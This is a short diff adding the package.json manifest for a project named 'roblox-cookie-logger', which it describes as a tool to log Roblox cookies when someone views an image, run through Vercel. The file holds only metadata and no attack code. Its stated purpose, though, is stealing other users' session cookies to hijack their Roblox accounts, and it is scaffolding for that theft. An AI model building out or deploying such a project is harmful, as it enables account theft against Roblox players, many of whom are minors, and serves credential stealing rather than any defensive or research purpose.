@@ -1,0 +1,11 @@
+{
+  "name": "roblox-cookie-logger",
+  "version": "1.0.0",
+  "description": "A tool to log Roblox cookies when viewing an image",
+  "main": "index.html",
+  "scripts": {
+    "start": "vercel dev"
+  },
+  "dependencies": {},
+  "devDependencies": {}
+}
